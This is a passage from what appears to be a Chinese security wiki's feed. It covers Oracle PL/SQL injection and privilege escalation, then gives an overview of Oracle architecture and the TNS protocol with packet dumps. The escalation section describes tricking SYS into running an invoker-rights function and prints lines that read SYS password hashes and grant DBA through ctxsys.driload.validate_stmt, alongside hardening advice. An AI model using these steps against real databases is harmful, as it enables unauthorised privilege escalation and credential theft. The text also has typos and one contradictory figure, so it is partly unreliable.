src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%9D%83%E9%99%90.png"></p><ol start="2"><li>调用者权限（AUTHID RURRENT_USER）</li></ol><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E8%B0%83%E7%94%A8%E8%80%85%E6%9D%83%E9%99%90.png"></p><h3 id="2-2-PL-SQL-注入分类"><a href="#2-2-PL-SQL-注入分类" class="headerlink" title="2.2 PL/SQL 注入分类"></a>2.2 PL/SQL 注入分类</h3><table><thead><tr><th>用户权限</th><th>具体权限</th><th>漏洞数</th><th>影响广度</th><th>解决方案</th></tr></thead><tbody><tr><td>高</td><td>EXECUTE ANT PROCEDURE</td><td>多</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>高</td><td>CREATE ANY TRIGGER</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>高</td><td>CREATE ANY VIEW</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>中</td><td>CREATE functions</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>中</td><td>CREATE procedure</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>低</td><td>CREATE connection-注入匿名</td><td>少</td><td>大</td><td>升级补丁、取消 public权限</td></tr><tr><td>低</td><td>CREATE connection-snarf攻击</td><td>极少</td><td>大</td><td>注意关闭游标</td></tr><tr><td>低</td><td>CREATE connection-利用java</td><td>极少</td><td>小</td><td>删除Java、取消 public权限</td></tr></tbody></table><h3 id="2-3-PL-SQL-漏洞利用"><a href="#2-3-PL-SQL-漏洞利用" class="headerlink" title="2.3 PL/SQL 漏洞利用"></a>2.3 PL/SQL 漏洞利用</h3><p>定义者权限和调用者权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT DBA TO USER</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT PASSWORD FROM SYS.USER$ WHERE NAME=&#x27;SYS&#x27;;</span><br></pre></td></tr></table></figure><p>用调用者权限创建一个函数——————————-&gt;用带有public权限的SYS函数调用黑客创建的函数</p><p>标准SQL注入提权思路例子：</p><p>1.用低权限用户写一个调用者权限的函数get_dba，内容是低权限用户无法执行的提权操作，并设置运行时编译。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%83.png"></p><p>2.将get_dba函数放入public，使得高权限用户可以防问；社会工程学诱骗，sys用户执行get_dba函数，成功提取。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%832.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%833.png"></p><h3 id="2-4-PL-SQL-DBMS-SQL包"><a href="#2-4-PL-SQL-DBMS-SQL包" class="headerlink" title="2.4 PL/SQL DBMS_SQL包"></a>2.4 PL/SQL DBMS_SQL包</h3><h4 id="2-4-1-DBMS-SQL执行流程"><a href="#2-4-1-DBMS-SQL执行流程" class="headerlink" title="2.4.1 DBMS_SQL执行流程"></a>2.4.1 DBMS_SQL执行流程</h4><p>通常运用DBMS_SQL包一般分为如下几步：</p><ol><li><p>open cursor：打开cursor</p></li><li><p>parse cursor：解析你要执行的SQL语句，生成任务计划</p></li><li><p>bind variable：如果要执行的SQL语句中包含变量，在此就需要绑定变量</p></li><li><p>execute：执行SQL语句</p></li><li><p>close cursor：在执行后关闭此cursor.</p></li></ol><p>如果你还需要返回执行SQL的结果集，还需要使用define_column,define_array等方法，具体可以看如下流程图：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p><h4 id="2-4-2-DBMS-SQL特点"><a href="#2-4-2-DBMS-SQL特点" class="headerlink" title="2.4.2 DBMS_SQL特点"></a>2.4.2 DBMS_SQL特点</h4><ul><li><p><strong>一定条件下可执行任意语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS_SQL_PARSE(C IN INTEGER, STATUMENT IN VARCHAR2, LANGUAGE_FLAG IN INTEGER) IS</span><br></pre></td></tr></table></figure></li><li><p><strong>包是PUBLIC属性，只要能连接到数据库就能调用</strong></p></li><li><p><strong>调用者权限</strong></p></li></ul><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E8%B0%83%E7%94%A8%E8%80%85%E6%9D%83%E9%99%90%E5%A3%B0%E6%98%8E.png"></p><p>想办法绕过调用者权限</p><p>1.高权限用户sys，定义一个名为A的public属性的具有定义者权限的过程，并调用了DBMS_SQL.PARSE接口，此接口存在一个参数能传入一个动态字符串并执行sql。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E7%AA%81%E7%A0%B4DBMS_SQL%E7%9A%84%E9%99%90%E5%88%B61.png"></p><p>2.低权限soctt用户执行public属性的A过程，虽然报错但是执行成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E7%AA%81%E7%A0%B4DBMS_SQL%E7%9A%84%E9%99%90%E5%88%B62.png"></p><p>3.提权成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F.png"></p><h4 id="2-4-3-漏洞成因"><a href="#2-4-3-漏洞成因" class="headerlink" title="2.4.3 漏洞成因"></a>2.4.3 漏洞成因</h4><p>危险的定义者权限</p><p>危险的public执行权限</p><p>禁止执行任意SQL语句</p><p>加强用户的身份识别</p><p>例子：在9i中ctxsys是DBA账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctxsys.driload.validate_stmt(&#x27;grant dba to public&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BE%8B%E5%AD%90.png"></p><p>10g后把这个包的创建者ctxsys权限从DBA中移除了</p><h3 id="2-5-PL-SQL-注入防护建议"><a href="#2-5-PL-SQL-注入防护建议" class="headerlink" title="2.5 PL/SQL 注入防护建议"></a>2.5 PL/SQL 注入防护建议</h3><p>DBMS_SQL.PARSE()最后调用ICD_PARSE，未传入了USERID</p><p>DBMS_SQL.PARSE_AS_USER()最后调用ICD_PARSE，传入了USERID</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E9%98%B2%E6%8A%A4%E7%94%A8%E6%88%B7%E5%88%A4%E6%96%AD.png"></p><p>所以建议使用DBMS_SQL.PARSE_AS_USER()</p><p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;by Tahir&lt;/p&gt;
&lt;h2 id=&quot;1-PL-SQL概述&quot;&gt;&lt;a href=&quot;#1-PL-SQL概述&quot; class=&quot;headerlink&quot; title=&quot;1.PL/SQL概述&quot;&gt;&lt;/a&gt;1.PL/SQL概述&lt;/h2&gt;&lt;p&gt;PL/SQL是一种</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database简单概述</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/</id>
    <published>2021-07-03T02:59:15.000Z</published>
    <updated>2021-07-03T03:04:35.397Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Oracle-数据库体系结构"><a href="#Oracle-数据库体系结构" class="headerlink" title="Oracle 数据库体系结构"></a>Oracle 数据库体系结构</h2><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/1.gif" style="zoom: 150%;">   <p>分为两个大部分：</p><h3 id="RDBMS-关系数据库管理系统"><a href="#RDBMS-关系数据库管理系统" class="headerlink" title="RDBMS 关系数据库管理系统"></a>RDBMS 关系数据库管理系统</h3><p>控制文件（.ctl）</p><p>数据文件（.dbf）</p><p>日志文件（.log）</p><p>SGA：系统全局区，主要包括：</p><p>共享池：用于存储最近定义的sql语句和数据定义。</p><p>Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。</p><p>1）数据块缓存区<br>数据块缓存区(datablockbuffercache)是SGA中的一个高速缓存区域，用来存储从数据库中读取数据段的数据块(如表、索引和簇)。数据块缓存区的大小由数据库服务器init.ora文件中的DB_LOCK_BUFFERS参数决定(用数据库块的个数表示)。在调整和管理数据库时，调整数据块缓存区的大小是一个重要的部分。</p><p>2）字典缓存区<br>数据库对象的信息存储在数据字典表中，这些信息包括用户帐号数据、数据文件名、段名、盘区位置、表说明和权限，当数据库需要这些信息(如检查用户查询一个表的授权)时，将读取数据字典表并且将返回的数据存储在字典缓存区的SGA中。</p><p>3）重做日志缓冲区<br>重做项描述对数据库进行的修改。它们写到联机重做日志文件中，以便在数据库恢复过程中用于向前滚动操作。然而，在被写入联机重做日志文件之前，事务首先被记录在称作重做日志缓冲区(redologbuffer)的SGA中。数据库可以周期地分批向联机重做日志文件中写重做项的内容，从而优化这个操作。重做日志缓冲区的大小(以字节为单位)由init.ora文件中的LOG_BUFFER参数决定。</p><p>4）SQL共享池<br>SQL共享池存储数据字典缓存区及库缓存区(librarycache)，即对数据库进行操作的语句信息。当数据块缓冲区和字典缓存区能够共享数据库用户间的结构及数据信息时，库缓存区允许共享常用的SQL语句。</p><p>SQL共享池包括执行计划及运行数据库的SQL语句的语法分析树。在第二次运行(由任何用户)相同的SQL语句时，可以利用SQL共享池中可用的语法分析信息来加快执行速度。</p><p>SQL共享池通过LRU算法来管理。当SQL共享池填满时，将从库缓存区中删掉最近最少使用的执行路径和语法分析树，以便为新的条目腾出空间。如果SQL共享池太小，语句将被连续不断地再装入到库缓存区，从而影响操作性能。</p><p>SQL共享池的大小(以字节为单位)由init.ora文件参数SHARED_POOL_SIZE决定。</p><p>5）大池<br>大池(LargePool)是一个可选内存区。如果使用线程服务器选项或频繁执行备份/恢复操作，只要创建一个大池，就可以更有效地管理这些操作。大池将致力于支持SQL大型命令。利用大池，就可以防止这些SQL大型命令把条目重写入SQL共享池中，从而减少再装入到库缓存区中的语句数量。大池的大小(以字节为单位)通过init.ora文件的LARGE_POOL_SIZE参数设置，用户可以使用init.ora文件的LARGE_POOL_MIN_ALLOC参数设置大池中的最小位置。Oracle8i已不用这个参数。作为使用LargePool的一种选择方案，可以用init.ora文件的SHARED_POOL_RESERVED_SIZE参数为SQL大型语句保留一部分SQL共享池。</p><p>6）Java池<br>由其名字可知，Java池为Java命令提供语法分析。Java池的大小(以字节为单位)通过在Oracle引入的init.ora文件的JAVA_POOL_SIZE参数设置。init.ora文件的JAVA_POOL_SIZE参数缺省设置为10MB。</p><p>7）多缓冲池<br>可以在SGA中创建多个缓冲池，能够用多个缓冲池把大数据集与其他的应用程序分开，以减少它们争夺数据块缓存区内相同资源的可能性。对于创建的每一个缓冲池，都要规定其LRU锁存器的大小和数量。缓冲区的数量必须至少比LRU锁存器的数量多50倍。</p><p>创建缓冲池时，需要规定保存区(keeparea)的大小和再循环区(recyclearea)的大小。与SQL共享池的保留区一样，保存区保持条目，而再循环区则被频繁地再循环使用。可以通过BUFFER_POOL_KEEP参数规定来保存区的大小。例如：<br>保存和再循环缓冲池的容量减少了数据块缓冲存储区中的可用空间(通过DB_BLOCK_BUFFERS参数设置)。对于使用一个新缓冲池的表，通过表的storage子句中的buffer_pool参数来规定缓冲池的名字。例如，如果需要从内存中快速删除一个表，就把它赋予RECYCLE池。缺省池叫作DEFAULT，这样就能在以后用altertable命令把一个表转移到DEFAULT池。</p><p>PGA：为用户进程保留的空间，即服务器进程。</p><p>后台进程：</p><p>• 数据库写进程(DBW<em>n</em>)</p><p>​        负责将数据库缓冲区高速缓存中经过修改的缓冲区（脏数据缓冲区）写入磁盘。在一个数据库实例中，DBWn进程最多可以启动36个，进程名分别为DBWn0、DBWn1、DBWn2、…DBWnj。</p><p>​        注：LRU（Least Recently Used，最近最少使用）：数据缓冲的一种管理机制，只保留最近数据，不保留旧数据。</p><p>​        注：DIRTY：表示“脏列”或者“弄脏了的数据”，实际上就是指被修改但是还没有写入数据文件的数据。</p><p>​        通过命令可以来了解参数信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter db_writer_processes;</span><br></pre></td></tr></table></figure><p>​        DBWn进程最多可以启动20个，所以DB_WRITER_PROCESSES参数的取值范围是1-36。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/3.png"> </p><p>• 日志写进程(LGWR)</p><p>​        负责管理日志缓冲区的一个后台进程，用于将日志缓冲区中的日志数据写入磁盘的日志文件中</p><p>​        在数据库运行时，对数据库的修改操作将被记录到日志信息中，这些日志信息首先保存在日志缓冲区，当日志信息达到一定量时，由LGWR进程将日志数据写入日志文件。</p><p>​        需要LGWR进程将缓冲区数据中的日志数据写入磁盘的主要情况有如下几种：</p><ul><li>用户进程提交（commit）事务</li><li>日志缓冲区池已满1/3</li><li>出现超时（每隔3秒）</li><li>DBWn进程调用磁盘写入进程</li></ul><p>• 检查点进程(CKPT)</p><p>　一般在发生日志切换时产生。在系统运行过程中，当需要将修改后的数据写回数据文件并且产生日志切换时就会产生检查点。检查点保证所有修改过的数据库缓冲区中的数据都被写入磁盘数据文件中。<br>　　在Oracle数据库中，提供了两个参数控制检查点的产生：一个是LOG_CHECKPOINT_TIMEOUT,用来设置检查点产生的时间间隔；另一个是LOG_CHECKPOINT_INTERVAL,用来设置一个检查点需要填充的日志文件块的数目也就是每产生多少个日志数据，自动产生一个检查点。</p><p>​        通过以下命令了解log_checkpoint_timeout参数信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_timeout; </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/4.png"></p><p>​        log_checkpoint_timeout参数默认值为1800，单位为秒。</p><p>​        通过以下命令可以了解log_checkpoint_interval 参数值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_interval;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/5.png"></p><p>​        log_checkpoint_interval参数值默认为0。</p><p>• 系统监视器进程(SMON)</p><p>​        在实例启动时执行实例恢复，并负责清理不再使用的临时段。在具有并行服务器选项的环境下，SMON进程对有故障的CPU或者实例进行实例恢复。SMON进程被有规律的唤醒，检查是否需要使用，其他进程需要时也可以调用次进程。（可被hacker调用）</p><p>​        实例恢复：</p><p>• 进程监视器进程(PMON)</p><p>​        用于在用户进程出现故障时执行进程恢复操作，并负责清理内存存储区和释放该进程所用的资源。改进程周期性的检查调度进程和服务器进程的状态，如果发现进程已死，则重新启动它。PMON进程被有规律的唤醒，检查是否需要使用，其他进程需要使用时也可以调用此进程。（可被hacker调用）</p><p>• 归档进程(ARC<em>n</em>)</p><p>• 恢复器进程(RECO)</p><p>• 封锁进程(LCK<em>n</em>)</p><p>• 调度进程(Dnn<em>n</em>)</p><p>• 快照进程(SNP<em>n</em>)</p><p>• 作业队列协调程序(CJQ0)</p><p>• 作业从属进程(J<em>nnn</em>)</p><p>• 队列监视器进程(QMN<em>n</em>)</p><h3 id="TNS监听服务"><a href="#TNS监听服务" class="headerlink" title="TNS监听服务"></a>TNS监听服务</h3><p>​        TNS监听是攻击的重点</p><h4 id="TNS协议结构"><a href="#TNS协议结构" class="headerlink" title="TNS协议结构"></a>TNS协议结构</h4><p>TNS 包由一个header和payload 组成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>通用Header8个字节：</p><table><thead><tr><th>Length</th><th>2</th><th>包的长度，包括通用包头</th></tr></thead><tbody><tr><td>Packet check sum</td><td>2</td><td>包的校验和</td></tr><tr><td>Type</td><td>1</td><td>TNS类型</td></tr><tr><td>Flag</td><td>1</td><td>状态</td></tr><tr><td>Header check sum</td><td>2</td><td>通用头的校验和</td></tr></tbody></table><p>注：</p><p>​    Length：包长度（包括包头）</p><p>​    Type： 数据包的类型</p><table><thead><tr><th>类型号</th><th></th><th>类型说明</th></tr></thead><tbody><tr><td>1</td><td>0x01</td><td>连接（CONNECT）</td></tr><tr><td>2</td><td>0x02</td><td>接受（ACCEPT）</td></tr><tr><td>3</td><td>0x03</td><td>确认（ACK）</td></tr><tr><td>4</td><td>0x04</td><td>拒绝（REFUTE）</td></tr><tr><td>5</td><td>0x05</td><td>重定向（REDIRECT）</td></tr><tr><td>6</td><td>0x06</td><td>数据（DATA）</td></tr><tr><td>7</td><td>0x07</td><td>NULL</td></tr><tr><td>8</td><td>0x08</td><td></td></tr><tr><td>9</td><td>0x09</td><td>中止（ABORT）</td></tr><tr><td>10</td><td>0x0a</td><td></td></tr><tr><td>11</td><td>0x0b</td><td>重新发送（RESEND）</td></tr><tr><td>12</td><td>0x0c</td><td>标记（MARKER）</td></tr><tr><td>13</td><td>0x0d</td><td>ATTENTION</td></tr><tr><td>14</td><td>0x0e</td><td>控制（CONTROL）</td></tr></tbody></table><p>payload：</p><p>Connect 连接类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 254</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Connect (1)</span><br><span class="line">    Reserved Byte: 00</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Connect</span><br><span class="line">        Version: 313</span><br><span class="line">        Version (Compatible): 300</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        NT Protocol Characteristics: 0xc60e</span><br><span class="line">        Line Turnaround Value: 0</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Length of Connect Data: 196</span><br><span class="line">        Offset to Connect Data: 58</span><br><span class="line">        Maximum Receivable Connect Data: 512</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line">        Trace Cross Facility Item 1: 0x00000000</span><br><span class="line">        Trace Cross Facility Item 2: 0x00000000</span><br><span class="line">        Trace Unique Connection ID: 0x0000000000000000</span><br><span class="line">        Connect Data: (DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=ORCL)(CID=(PROGRAM=</span><br><span class="line">                       C:\oracle\product\10.2.0\client_1\bin\sqlplus.exe)</span><br><span class="line">                       (HOST=WINXPSP2)(USER=vmware)))(ADDRESS=(PROTOCOL=TCP)</span><br><span class="line">                       (HOST=192.168.1.102)(PORT=1521)))</span><br><span class="line"> 0.018134   192.168.1.108   192.168.1.102   TNS Request, Connect (1), Connect</span><br><span class="line"> 0000   00 0c 29 0c 9a c7 00 0c 29 fd 07 3d 08 00 45 00  ..).....)..=..E.</span><br><span class="line"> 0010   01 26 05 0b 40 00 80 06 70 a4 c0 a8 01 6c c0 a8  .&amp;..@...p....l..</span><br><span class="line"> 0020   01 66 04 66 05 f1 ac 94 a7 3e 66 d2 7e ee 50 18  .f.f.....&gt;f.~.P.</span><br><span class="line"> 0030   ff ff 15 91 00 00 00 fe 00 00 01 00 00 00 01 39  ...............9</span><br><span class="line"> 0040   01 2c 00 00 08 00 7f ff c6 0e 00 00 01 00 00 c4  .,..............</span><br><span class="line"> 0050   00 3a 00 00 02 00 61 61 00 00 00 00 00 00 00 00  .:....aa........</span><br><span class="line"> 0060   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"> 0070   28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28 43 4f  (DESCRIPTION=(CO</span><br><span class="line"> 0080   4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line"> 0090   49 43 45 5f 4e 41 4d 45 3d 4f 52 43 4c 29 28 43  ICE_NAME=ORCL)(C</span><br><span class="line"> 00a0   49 44 3d 28 50 52 4f 47 52 41 4d 3d 43 3a 5c 6f  ID=(PROGRAM=C:\o</span><br><span class="line"> 00b0   72 61 63 6c 65 5c 70 72 6f 64 75 63 74 5c 31 30  racle\product\10</span><br><span class="line"> 00c0   2e 32 2e 30 5c 63 6c 69 65 6e 74 5f 31 5c 62 69  .2.0\client_1\bi</span><br><span class="line"> 00d0   6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line"> 00e0   4f 53 54 3d 57 49 4e 58 50 53 50 32 29 28 55 53  OST=WINXPSP2)(US</span><br><span class="line"> 00f0   45 52 3d 76 6d 77 61 72 65 29 29 29 28 41 44 44  ER=vmware)))(ADD</span><br><span class="line"> 0100   52 45 53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 54  RESS=(PROTOCOL=T</span><br><span class="line"> 0110   43 50 29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38  CP)(HOST=192.168</span><br><span class="line"> 0120   2e 31 2e 31 30 32 29 28 50 4f 52 54 3d 31 35 32  .1.102)(PORT=152</span><br><span class="line"> 0130   31 29 29 29                                      1)))</span><br></pre></td></tr></table></figure><p>Accept接收类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 32</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Accept (2)</span><br><span class="line">    Reserved Byte: 04</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Accept</span><br><span class="line">        Version: 312</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Accept Data Length: 0</span><br><span class="line">        Offset to Accept Data: 32</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line"> 00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00   ..)..=..).....E.</span><br><span class="line"> 00 48 7c cf 40 00 80 06 f9 bd c0 a8 01 66 c0 a8   .H|.@........f..</span><br><span class="line"> 01 6c 11 d9 04 67 b6 88 7a 22 0e a7 cb 81 50 18   .l...g..z&quot;....P.</span><br><span class="line"> ff 01 1d 97 00 00 00 20 00 00 02 04 00 00 01 38   ....... .......8</span><br><span class="line"> 00 00 08 00 7f ff 01 00 00 00 00 20 61 61 00 00   ........... aa..</span><br><span class="line"> 00 00 00 00 00 00                                 ......</span><br></pre></td></tr></table></figure><p>Refuse拒绝类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0.047753   192.168.1.102   192.168.1.108   TNS Response, Refuse (4), Refuse</span><br><span class="line">  00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00  ..)..=..).....E.</span><br><span class="line">  00 8f 53 e2 40 00 80 06 22 64 c0 a8 01 66 c0 a8  ..S.@...&quot;d...f..</span><br><span class="line">  01 6c 05 f1 04 0d e8 a0 2d 2b 67 0d 99 85 50 18  .l......-+g...P.</span><br><span class="line">  fe ff 59 03 00 00 00 67 00 00 04 00 00 00 22 00  ..Y....g......&quot;.</span><br><span class="line">  00 5b 28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28  .[(DESCRIPTION=(</span><br><span class="line">  54 4d 50 3d 29 28 56 53 4e 4e 55 4d 3d 31 35 33  TMP=)(VSNNUM=153</span><br><span class="line">  30 39 32 33 35 32 29 28 45 52 52 3d 31 32 35 31  092352)(ERR=1251</span><br><span class="line">  34 29 28 45 52 52 4f 52 5f 53 54 41 43 4b 3d 28  4)(ERROR_STACK=(</span><br><span class="line">  45 52 